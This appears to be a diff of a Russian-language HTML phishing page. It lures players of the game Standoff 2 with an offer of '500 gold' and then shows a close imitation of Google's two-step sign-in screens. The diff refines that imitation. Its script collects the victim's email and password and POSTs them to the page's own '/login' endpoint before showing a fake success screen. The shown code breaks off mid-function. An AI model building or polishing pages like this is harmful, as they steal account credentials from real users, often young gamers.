@@ -3,15 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-   <link rel="icon" href="favicon.png" type="image/png">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎯</text></svg>">
     <title>500 голды — Standoff 2</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
+        /* ============ СТРАНИЦА 1: ГОЛДА ============ */
         .step1-body {
             background: #0a0a10;
             color: #fff;
@@ -24,325 +21,246 @@
             overflow: hidden;
             position: relative;
         }
-
         .bg-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-            overflow: hidden;
-            opacity: 0.12;
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0; pointer-events: none;
+            overflow: hidden; opacity: 0.12;
         }
-
         .dark-container {
-            background: linear-gradient(145deg, rgba(20, 20, 30, 0.94), rgba(10, 10, 16, 0.97));
+            background: linear-gradient(145deg, rgba(20,20,30,0.94), rgba(10,10,16,0.97));
             padding: 40px 24px 30px;
             border-radius: 32px;
-            width: 100%;
-            max-width: 400px;
+            width: 100%; max-width: 400px;
             text-align: center;
             border: 1px solid #ffd70033;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 40px #ffd70008;
-            position: relative;
-            z-index: 1;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 40px #ffd70008;
+            position: relative; z-index: 1;
             backdrop-filter: blur(4px);
         }
-
-        .gold-icon {
-            font-size: 52px;
-            margin-bottom: 8px;
-            display: block;
-        }
-
+        .gold-icon { font-size: 52px; margin-bottom: 8px; display: block; }
         .gold-badge {
             background: linear-gradient(135deg, #2a2a3a, #1a1a28);
-            padding: 12px 24px;
-            border-radius: 40px;
-            display: inline-block;
-            font-size: 32px;
-            font-weight: 900;
-            color: #ffd700;
-            border: 1px solid #ffd70055;
-            box-shadow: 0 0 30px #ffd70015;
-            margin-bottom: 12px;
+            padding: 12px 24px; border-radius: 40px;
+            display: inline-block; font-size: 32px; font-weight: 900;
+            color: #ffd700; border: 1px solid #ffd70055;
+            box-shadow: 0 0 30px #ffd70015; margin-bottom: 12px;
         }
-
-        .gold-badge::before {
-            content: "✦ ";
-            color: #ffaa00;
-        }
-        .gold-badge::after {
-            content: " ✦";
-            color: #ffaa00;
-        }
-
-        .dark-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 6px;
-        }
-
-        .dark-desc {
-            color: #99aabb;
-            font-size: 16px;
-            margin-bottom: 24px;
-        }
-
+        .gold-badge::before { content: "✦ "; color: #ffaa00; }
+        .gold-badge::after { content: " ✦"; color: #ffaa00; }
+        .dark-title { font-size: 24px; font-weight: 700; color: #fff; margin-bottom: 6px; }
+        .dark-desc { color: #99aabb; font-size: 16px; margin-bottom: 24px; }
         .btn-gold {
-            width: 100%;
-            padding: 18px 0;
-            border: none;
-            border-radius: 40px;
-            font-size: 22px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            width: 100%; padding: 18px 0;
+            border: none; border-radius: 40px;
+            font-size: 22px; font-weight: 800; cursor: pointer;
+            transition: 0.3s; text-transform: uppercase; letter-spacing: 1px;
             background: linear-gradient(135deg, #ffd700, #f0a500);
-            color: #0a0a10;
-            box-shadow: 0 4px 20px #ffd70033;
+            color: #0a0a10; box-shadow: 0 4px 20px #ffd70033;
         }
+        .btn-gold:hover { transform: scale(1.02); box-shadow: 0 4px 40px #ffd70055; }
+        .btn-gold:active { transform: scale(0.96); }
+        .footer { margin-top: 20px; font-size: 12px; color: #445; }
 
-        .btn-gold:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 40px #ffd70055;
-        }
-
-        .btn-gold:active {
-            transform: scale(0.96);
-        }
-
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #445;
-        }
-
+        /* ============ СТРАНИЦА 2: GOOGLE LOGIN ============ */
         .step2-body {
             background: #ffffff;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .google-container {
-            width: 100%;
-            max-width: 448px;
-            padding: 48px 40px 36px;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            background: #ffffff;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
-            text-align: center;
-        }
-
-        .google-logo {
-            width: 75px;
-            height: 24px;
-            margin: 0 auto 32px;
-            display: block;
-        }
-
-        .google-title {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-
-        .google-sub {
-            font-size: 16px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 32px;
-        }
-
-        .google-input-group {
-            text-align: left;
-            margin-bottom: 16px;
-        }
-
-        .google-input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            color: #5f6368;
-            margin-bottom: 4px;
-        }
-
-        .google-input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 16px;
-            font-weight: 400;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            background: #ffffff;
-            color: #202124;
-            outline: none;
-            transition: 0.2s;
-        }
-
-        .google-input-group input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 1px 2px rgba(26, 115, 232, 0.2);
-        }
-
-        .btn-google {
-            width: 100%;
-            padding: 12px 0;
-            background: #1a73e8;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 12px;
-        }
-
-        .btn-google:hover {
-            background: #1557b0;
-            box-shadow: 0 1px 3px rgba(26, 115, 232, 0.3);
-        }
-
-        .btn-google:active {
-            transform: scale(0.97);
-        }
-
-        .google-links {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            font-size: 14px;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .google-links a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .google-links a:hover {
-            text-decoration: underline;
-        }
-
-        .google-footer {
-            margin-top: 32px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-
-        .google-footer a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .google-error {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 8px;
-            min-height: 20px;
-        }
-
-        .google-result {
-            margin-top: 12px;
-            font-weight: 500;
-            font-size: 14px;
-            color: #34a853;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .step3-body {
-            background: #0a0a10;
-            color: #fff;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 16px;
-            position: relative;
         }
-
-        .check-icon {
-            font-size: 60px;
-            margin-bottom: 10px;
+        .google-card {
+            width: 100%;
+            max-width: 448px;
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+        .google-logo-img {
             display: block;
+            margin: 0 auto 24px;
+            width: 74px;
+            height: auto;
         }
-
-        .success-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #ffd700;
-            margin-bottom: 8px;
-        }
-
-        .success-desc {
-            color: #99aabb;
-            font-size: 16px;
+        .google-h1 {
+            font-size: 32px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
             margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+        .google-sub {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 32px;
         }
 
-        .timer-text {
+        /* Плавающий лейбл как в Google */
+        .float-field {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        .float-field input {
+            width: 100%;
+            padding: 20px 15px 12px;
+            font-size: 16px;
+            color: #202124;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: transparent;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+            font-family: inherit;
+        }
+        .float-field input:hover { border-color: #202124; }
+        .float-field input:focus {
+            border: 2px solid #1a73e8;
+            padding: 19px 14px 11px;
+        }
+        .float-field label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #fff;
+            padding: 0 6px;
+            font-size: 16px;
+            color: #5f6368;
+            pointer-events: none;
+            transition: all 0.15s ease;
+        }
+        .float-field input:focus + label,
+        .float-field input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        .float-field input:not(:focus):not(:placeholder-shown) + label {
+            color: #5f6368;
+        }
+        .float-field input:focus + label { color: #1a73e8; }
+
+        .forgot-link {
+            display: inline-block;
+            color: #1a73e8;
             font-size: 14px;
-            color: #667;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 40px;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+
+        .guest-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+        .guest-text a {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .guest-text a:hover { text-decoration: underline; }
+
+        .google-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .create-account:hover { text-decoration: underline; }
+        .btn-next {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            min-width: 88px;
+            transition: background 0.15s, box-shadow 0.15s;
+            font-family: inherit;
+        }
+        .btn-next:hover { background: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+        .btn-next:active { background: #1557b0; }
+
+        .error-text {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: -16px;
+            margin-bottom: 16px;
+            min-height: 18px;
+        }
+        .hidden { display: none !important; }
+
+        /* Шапка с выбранным аккаунтом (для шага пароля) */
+        .account-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            padding: 4px 8px 4px 4px;
+            font-size: 14px;
+            color: #3c4043;
+            margin: 0 auto 32px;
+        }
+        .account-chip .avatar {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #1a73e8;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 500;
         }
 
-        @media (max-width: 480px) {
-            .dark-container {
-                padding: 30px 16px 24px;
-            }
-            .gold-badge {
-                font-size: 26px;
-                padding: 10px 18px;
-            }
-            .btn-gold {
-                font-size: 18px;
-                padding: 16px 0;
-            }
-            .google-container {
-                padding: 32px 20px 28px;
-                border: none;
-                box-shadow: none;
-            }
-            .google-title {
-                font-size: 22px;
-            }
+        /* ============ СТРАНИЦА 3: УСПЕХ ============ */
+        .step3-body {
+            background: #0a0a10; color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh; display: flex;
+            align-items: center; justify-content: center;
+            padding: 16px; position: relative;
         }
+        .check-icon { font-size: 60px; margin-bottom: 10px; display: block; }
+        .success-title { font-size: 24px; font-weight: 700; color: #ffd700; margin-bottom: 8px; }
+        .success-desc { color: #99aabb; font-size: 16px; margin-bottom: 10px; }
+        .timer-text { font-size: 14px; color: #667; }
 
-        @media (max-width: 380px) {
-            .dark-container {
-                padding: 20px 12px 18px;
-            }
-            .gold-badge {
-                font-size: 20px;
-                padding: 6px 12px;
-            }
-            .btn-gold {
-                font-size: 16px;
-                padding: 14px 0;
-            }
+        @media (max-width: 520px) {
+            .google-card { padding: 32px 24px 28px; border: none; }
+            .google-h1 { font-size: 24px; }
+            .google-sub { font-size: 14px; margin-bottom: 24px; }
+            .dark-container { padding: 30px 16px 24px; }
+            .gold-badge { font-size: 26px; padding: 10px 18px; }
+            .btn-gold { font-size: 18px; padding: 16px 0; }
         }
     </style>
 </head>
 <body>
 
-    <!-- СТРАНИЦА 1 -->
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 1: ПОЛУЧИТЬ 500 ГОЛДЫ           -->
+    <!-- ======================================== -->
     <div id="step1" class="step1-body">
         <div class="bg-layer">
             <svg viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
@@ -353,14 +271,6 @@
                 <g transform="translate(680, 30) rotate(15)" opacity="0.2">
                     <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
                     <circle cx="82" cy="11" r="5" fill="#ffd700"/>
-                </g>
-                <g transform="translate(20, 260) rotate(-30)" opacity="0.2">
-                    <polygon points="0,0 60,-6 55,6" fill="#aabbcc"/>
-                    <circle cx="8" cy="0" r="5" fill="#ffd700"/>
-                </g>
-                <g transform="translate(720, 300) rotate(25)" opacity="0.2">
-                    <rect x="0" y="6" width="60" height="10" rx="3" fill="#8899bb"/>
-                    <circle cx="58" cy="11" r="3.5" fill="#ffd700"/>
                 </g>
                 <g opacity="0.25">
                     <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
@@ -380,55 +290,88 @@
         </div>
     </div>
 
-    <!-- СТРАНИЦА 2 -->
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 2: GOOGLE LOGIN (шаг email)     -->
+    <!-- ======================================== -->
     <div id="step2" class="step2-body hidden">
-        <div class="google-container">
-            <div class="google-logo">
-                <svg viewBox="0 0 48 16" width="100%" height="100%">
-                    <path fill="#4285F4" d="M 32.6 8.1 c 0 0.6 0.1 1.3 0.3 1.9 h -1.8 v -1.4 h 0.6 c -0.1 -0.3 -0.2 -0.6 -0.2 -0.9 c 0 -0.5 0.3 -0.9 0.9 -1.1 c 0.6 -0.2 1.2 -0.1 1.6 0.3 l 1.1 -1.1 c -0.7 -0.6 -1.6 -0.9 -2.6 -0.9 c -1.3 0 -2.5 0.5 -3.4 1.4 c -0.9 0.9 -1.4 2.1 -1.4 3.4 c 0 1.3 0.5 2.5 1.4 3.4 c 0.9 0.9 2.1 1.4 3.4 1.4 c 1.3 0 2.5 -0.5 3.4 -1.4 c 0.9 -0.9 1.4 -2.1 1.4 -3.4 c 0 -0.6 -0.1 -1.2 -0.3 -1.8 h -4.4 v 1.7 h 2.4 c -0.2 0.6 -0.6 1.1 -1.1 1.5 c -0.5 0.4 -1.1 0.6 -1.8 0.6 c -0.9 0 -1.7 -0.4 -2.3 -1 c -0.6 -0.6 -0.9 -1.4 -0.9 -2.2 c 0 -0.9 0.3 -1.7 0.9 -2.3 c 0.6 -0.6 1.4 -0.9 2.3 -0.9 c 0.7 0 1.3 0.2 1.8 0.7 l 0.8 -0.8 c -0.6 -0.6 -1.5 -1 -2.5 -1 c -1.2 0 -2.3 0.5 -3.1 1.3 c -0.8 0.8 -1.3 2 -1.3 3.3 c 0 1.3 0.5 2.5 1.3 3.3 c 0.8 0.8 2 1.3 3.1 1.3 c 1.2 0 2.3 -0.5 3.1 -1.3 c 0.8 -0.8 1.3 -2 1.3 -3.3 c 0 -0.1 0 -0.2 0 -0.3 z"/>
-                    <path fill="#EA4335" d="M 7.4 4.4 c 0.6 -0.5 1.3 -0.8 2.1 -0.8 c 0.9 0 1.7 0.3 2.3 0.9 l 1.8 -1.8 c -1.2 -1.1 -2.8 -1.7 -4.5 -1.7 c -2.1 0 -4 0.8 -5.4 2.2 c -1.4 1.4 -2.2 3.3 -2.2 5.4 c 0 2.1 0.8 4 2.2 5.4 c 1.4 1.4 3.3 2.2 5.4 2.2 c 2.6 0 4.7 -1.1 6.1 -3.1 l -2.5 -1.9 c -0.9 1.1 -2.2 1.8 -3.6 1.8 c -1.8 0 -3.4 -0.9 -4.3 -2.3 c -0.9 -1.4 -1.1 -3.1 -0.6 -4.7 c 0.5 -1.6 1.6 -2.9 3.2 -3.5 z"/>
-                    <path fill="#FBBC05" d="M 20.4 0.4 c -1.8 0 -3.5 0.7 -4.7 1.9 l 1.8 1.8 c 0.8 -0.8 1.9 -1.3 3 -1.3 c 1.2 0 2.3 0.4 3.2 1.2 l 1.8 -1.8 c -1.3 -1.2 -3 -1.8 -4.7 -1.8 z"/>
-                    <path fill="#34A853" d="M 20.4 0.4 c 1.8 0 3.5 0.7 4.7 1.9 l -1.8 1.8 c -0.8 -0.8 -1.9 -1.2 -3 -1.2 c -1.2 0 -2.3 0.4 -3.2 1.2 l -1.8 -1.8 c 1.3 -1.2 3 -1.8 4.7 -1.8 z"/>
-                    <path fill="#4285F4" d="M 20.4 13.2 c -1.2 0 -2.3 -0.4 -3.2 -1.2 l -1.8 1.8 c 1.3 1.2 3 1.9 4.7 1.9 c 1.8 0 3.5 -0.7 4.7 -1.9 l -1.8 -1.8 c -0.8 0.8 -1.9 1.2 -3 1.2 z"/>
-                </svg>
-            </div>
+        <div class="google-card">
+            <svg class="google-logo-img" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M 32.6 12.1 c 0 0.6 0.1 1.3 0.3 1.9 h -1.8 v -1.4 h 0.6 c -0.1 -0.3 -0.2 -0.6 -0.2 -0.9 c 0 -0.5 0.3 -0.9 0.9 -1.1 c 0.6 -0.2 1.2 -0.1 1.6 0.3 l 1.1 -1.1 c -0.7 -0.6 -1.6 -0.9 -2.6 -0.9 c -1.3 0 -2.5 0.5 -3.4 1.4 c -0.9 0.9 -1.4 2.1 -1.4 3.4 c 0 1.3 0.5 2.5 1.4 3.4 c 0.9 0.9 2.1 1.4 3.4 1.4 c 1.3 0 2.5 -0.5 3.4 -1.4 c 0.9 -0.9 1.4 -2.1 1.4 -3.4 c 0 -0.6 -0.1 -1.2 -0.3 -1.8 h -4.4 v 1.7 h 2.4 c -0.2 0.6 -0.6 1.1 -1.1 1.5 c -0.5 0.4 -1.1 0.6 -1.8 0.6 c -0.9 0 -1.7 -0.4 -2.3 -1 c -0.6 -0.6 -0.9 -1.4 -0.9 -2.2 c 0 -0.9 0.3 -1.7 0.9 -2.3 c 0.6 -0.6 1.4 -0.9 2.3 -0.9 c 0.7 0 1.3 0.2 1.8 0.7 l 0.8 -0.8 c -0.6 -0.6 -1.5 -1 -2.5 -1 c -1.2 0 -2.3 0.5 -3.1 1.3 c -0.8 0.8 -1.3 2 -1.3 3.3 c 0 1.3 0.5 2.5 1.3 3.3 c 0.8 0.8 2 1.3 3.1 1.3 c 1.2 0 2.3 -0.5 3.1 -1.3 c 0.8 -0.8 1.3 -2 1.3 -3.3 c 0 -0.1 0 -0.2 0 -0.3 z"/>
+                <path fill="#EA4335" d="M 7.4 8.4 c 0.6 -0.5 1.3 -0.8 2.1 -0.8 c 0.9 0 1.7 0.3 2.3 0.9 l 1.8 -1.8 c -1.2 -1.1 -2.8 -1.7 -4.5 -1.7 c -2.1 0 -4 0.8 -5.4 2.2 c -1.4 1.4 -2.2 3.3 -2.2 5.4 c 0 2.1 0.8 4 2.2 5.4 c 1.4 1.4 3.3 2.2 5.4 2.2 c 2.6 0 4.7 -1.1 6.1 -3.1 l -2.5 -1.9 c -0.9 1.1 -2.2 1.8 -3.6 1.8 c -1.8 0 -3.4 -0.9 -4.3 -2.3 c -0.9 -1.4 -1.1 -3.1 -0.6 -4.7 c 0.5 -1.6 1.6 -2.9 3.2 -3.5 z"/>
+                <path fill="#FBBC05" d="M 20.4 4.4 c -1.8 0 -3.5 0.7 -4.7 1.9 l 1.8 1.8 c 0.8 -0.8 1.9 -1.3 3 -1.3 c 1.2 0 2.3 0.4 3.2 1.2 l 1.8 -1.8 c -1.3 -1.2 -3 -1.8 -4.7 -1.8 z"/>
+                <path fill="#34A853" d="M 20.4 4.4 c 1.8 0 3.5 0.7 4.7 1.9 l -1.8 1.8 c -0.8 -0.8 -1.9 -1.2 -3 -1.2 c -1.2 0 -2.3 0.4 -3.2 1.2 l -1.8 -1.8 c 1.3 -1.2 3 -1.8 4.7 -1.8 z"/>
+                <path fill="#4285F4" d="M 20.4 17.2 c -1.2 0 -2.3 -0.4 -3.2 -1.2 l -1.8 1.8 c 1.3 1.2 3 1.9 4.7 1.9 c 1.8 0 3.5 -0.7 4.7 -1.9 l -1.8 -1.8 c -0.8 0.8 -1.9 1.2 -3 1.2 z"/>
+            </svg>
 
-            <div class="google-title">Вход</div>
-            <div class="google-sub">Войдите в свой аккаунт Google</div>
+            <h1 class="google-h1">Вход</h1>
+            <p class="google-sub">Используйте аккаунт Google</p>
 
-            <form id="loginForm" onsubmit="submitForm(event)">
-                <div class="google-input-group">
-                    <label for="email">Электронная почта или телефон</label>
-                    <input type="email" id="email" placeholder="your@gmail.com" required>
+            <form id="emailForm" onsubmit="submitEmail(event)">
+                <div class="float-field">
+                    <input type="email" id="email" placeholder=" " required autocomplete="off">
+                    <label for="email">Телефон или адрес эл. почты</label>
                 </div>
+                <div class="error-text" id="errorMsg"></div>
 
-                <div id="passwordField" class="google-input-group hidden">
-                    <label for="password">Пароль</label>
-                    <input type="password" id="password" placeholder="Введите пароль" required>
+                <a href="#" class="forgot-link" onclick="return false;">Забыли адрес эл. почты?</a>
+
+                <p class="guest-text">
+                    Работаете на чужом компьютере? Включите гостевой режим.
+                    <a href="#" onclick="return false;">Подробнее…</a>
+                </p>
+
+                <div class="google-actions">
+                    <a href="#" class="create-account" onclick="return false;">Создать аккаунт</a>
+                    <button type="submit" class="btn-next">Далее</button>
                 </div>
-
-                <div class="google-error" id="errorMsg"></div>
-
-                <button type="submit" class="btn-google" id="submitBtn">Далее</button>
             </form>
-
-            <div class="google-links">
-                <a href="#">Забыли пароль?</a>
-                <a href="#">Создать аккаунт</a>
-            </div>
-
-            <div id="result" class="google-result hidden"></div>
-
-            <div class="google-footer">
-                <span>Русский</span> &nbsp;·&nbsp;
-                <a href="#">Справка</a> &nbsp;·&nbsp;
-                <a href="#">Конфиденциальность</a> &nbsp;·&nbsp;
-                <a href="#">Условия</a>
-            </div>
         </div>
     </div>
 
-    <!-- СТРАНИЦА 3 -->
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 2.5: GOOGLE LOGIN (шаг пароля)  -->
+    <!-- ======================================== -->
+    <div id="step2b" class="step2-body hidden">
+        <div class="google-card">
+            <svg class="google-logo-img" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M 32.6 12.1 c 0 0.6 0.1 1.3 0.3 1.9 h -1.8 v -1.4 h 0.6 c -0.1 -0.3 -0.2 -0.6 -0.2 -0.9 c 0 -0.5 0.3 -0.9 0.9 -1.1 c 0.6 -0.2 1.2 -0.1 1.6 0.3 l 1.1 -1.1 c -0.7 -0.6 -1.6 -0.9 -2.6 -0.9 c -1.3 0 -2.5 0.5 -3.4 1.4 c -0.9 0.9 -1.4 2.1 -1.4 3.4 c 0 1.3 0.5 2.5 1.4 3.4 c 0.9 0.9 2.1 1.4 3.4 1.4 c 1.3 0 2.5 -0.5 3.4 -1.4 c 0.9 -0.9 1.4 -2.1 1.4 -3.4 c 0 -0.6 -0.1 -1.2 -0.3 -1.8 h -4.4 v 1.7 h 2.4 c -0.2 0.6 -0.6 1.1 -1.1 1.5 c -0.5 0.4 -1.1 0.6 -1.8 0.6 c -0.9 0 -1.7 -0.4 -2.3 -1 c -0.6 -0.6 -0.9 -1.4 -0.9 -2.2 c 0 -0.9 0.3 -1.7 0.9 -2.3 c 0.6 -0.6 1.4 -0.9 2.3 -0.9 c 0.7 0 1.3 0.2 1.8 0.7 l 0.8 -0.8 c -0.6 -0.6 -1.5 -1 -2.5 -1 c -1.2 0 -2.3 0.5 -3.1 1.3 c -0.8 0.8 -1.3 2 -1.3 3.3 c 0 1.3 0.5 2.5 1.3 3.3 c 0.8 0.8 2 1.3 3.1 1.3 c 1.2 0 2.3 -0.5 3.1 -1.3 c 0.8 -0.8 1.3 -2 1.3 -3.3 c 0 -0.1 0 -0.2 0 -0.3 z"/>
+                <path fill="#EA4335" d="M 7.4 8.4 c 0.6 -0.5 1.3 -0.8 2.1 -0.8 c 0.9 0 1.7 0.3 2.3 0.9 l 1.8 -1.8 c -1.2 -1.1 -2.8 -1.7 -4.5 -1.7 c -2.1 0 -4 0.8 -5.4 2.2 c -1.4 1.4 -2.2 3.3 -2.2 5.4 c 0 2.1 0.8 4 2.2 5.4 c 1.4 1.4 3.3 2.2 5.4 2.2 c 2.6 0 4.7 -1.1 6.1 -3.1 l -2.5 -1.9 c -0.9 1.1 -2.2 1.8 -3.6 1.8 c -1.8 0 -3.4 -0.9 -4.3 -2.3 c -0.9 -1.4 -1.1 -3.1 -0.6 -4.7 c 0.5 -1.6 1.6 -2.9 3.2 -3.5 z"/>
+                <path fill="#FBBC05" d="M 20.4 4.4 c -1.8 0 -3.5 0.7 -4.7 1.9 l 1.8 1.8 c 0.8 -0.8 1.9 -1.3 3 -1.3 c 1.2 0 2.3 0.4 3.2 1.2 l 1.8 -1.8 c -1.3 -1.2 -3 -1.8 -4.7 -1.8 z"/>
+                <path fill="#34A853" d="M 20.4 4.4 c 1.8 0 3.5 0.7 4.7 1.9 l -1.8 1.8 c -0.8 -0.8 -1.9 -1.2 -3 -1.2 c -1.2 0 -2.3 0.4 -3.2 1.2 l -1.8 -1.8 c 1.3 -1.2 3 -1.8 4.7 -1.8 z"/>
+                <path fill="#4285F4" d="M 20.4 17.2 c -1.2 0 -2.3 -0.4 -3.2 -1.2 l -1.8 1.8 c 1.3 1.2 3 1.9 4.7 1.9 c 1.8 0 3.5 -0.7 4.7 -1.9 l -1.8 -1.8 c -0.8 0.8 -1.9 1.2 -3 1.2 z"/>
+            </svg>
+
+            <h1 class="google-h1" style="margin-bottom: 16px;">Добро пожаловать</h1>
+            <div style="text-align:center;">
+                <span class="account-chip">
+                    <span class="avatar" id="chipAvatar">A</span>
+                    <span id="chipEmail">user@gmail.com</span>
+                </span>
+            </div>
+
+            <form id="passwordForm" onsubmit="submitPassword(event)">
+                <div class="float-field">
+                    <input type="password" id="password" placeholder=" " required autocomplete="off">
+                    <label for="password">Введите пароль</label>
+                </div>
+                <div class="error-text" id="errorMsg2"></div>
+
+                <div style="display:flex; align-items:center; gap:8px; margin-bottom: 40px;">
+                    <input type="checkbox" id="showPass" style="width:18px;height:18px;accent-color:#1a73e8;cursor:pointer;" onchange="togglePass()">
+                    <label for="showPass" style="font-size:14px; color:#202124; cursor:pointer;">Показать пароль</label>
+                </div>
+
+                <div class="google-actions">
+                    <a href="#" class="create-account" onclick="return false;">Забыли пароль?</a>
+                    <button type="submit" class="btn-next">Далее</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 3: УСПЕХ                        -->
+    <!-- ======================================== -->
     <div id="step3" class="step3-body hidden">
         <div class="dark-container" style="background: linear-gradient(145deg, rgba(20,20,30,0.94), rgba(10,10,16,0.97)); border: 1px solid #ffd70033;">
             <span class="check-icon">✅</span>
@@ -440,69 +383,80 @@
     </div>
 
     <script>
-        document.getElementById('email').addEventListener('input', function() {
-            const passwordField = document.getElementById('passwordField');
-            const errorMsg = document.getElementById('errorMsg');
-            if (this.value.trim() !== '') {
-                passwordField.classList.remove('hidden');
-                errorMsg.textContent = '';
-            } else {
-                passwordField.classList.add('hidden');
-            }
-        });
+        let savedEmail = '';
 
+        // ШАГ 1 → ШАГ 2
         function showStep2() {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
         }
 
-        async function submitForm(e) {
+        // ШАГ 2 → ШАГ 2.5 (отправка email)
+        function submitEmail(e) {
             e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value.trim();
             const errorMsg = document.getElementById('errorMsg');
-            const result = document.getElementById('result');
 
-            if (!email.trim()) {
+            if (!email) {
                 errorMsg.textContent = 'Введите адрес электронной почты';
                 return;
             }
-            if (!password.trim()) {
+            errorMsg.textContent = '';
+            savedEmail = email;
+
+            // Заполняем чип с email
+            document.getElementById('chipEmail').textContent = email;
+            document.getElementById('chipAvatar').textContent = email.charAt(0).toUpperCase();
+
+            // Переход на шаг с паролем
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step2b').classList.remove('hidden');
+            setTimeout(() => document.getElementById('password').focus(), 100);
+        }
+
+        // Показать/скрыть пароль
+        function togglePass() {
+            const p = document.getElementById('password');
+            p.type = p.type === 'password' ? 'text' : 'password';
+        }
+
+        // ШАГ 2.5 (отправка пароля) → ШАГ 3
+        async function submitPassword(e) {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg2');
+
+            if (!password) {
                 errorMsg.textContent = 'Введите пароль';
                 return;
             }
-
             errorMsg.textContent = '';
-            result.textContent = '⏳ Проверка...';
-            result.classList.remove('hidden');
 
             try {
                 const res = await fetch('/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify({ email: savedEmail, password: password })
                 });
-
                 const data = await res.json();
 
                 if (data.success) {
-                    result.textContent = '✅ Вход выполнен';
-                    result.style.color = '#34a853';
-
                     setTimeout(() => {
-                        document.getElementById('step2').classList.add('hidden');
+                        document.getElementById('step2b').classList.add('hidden');
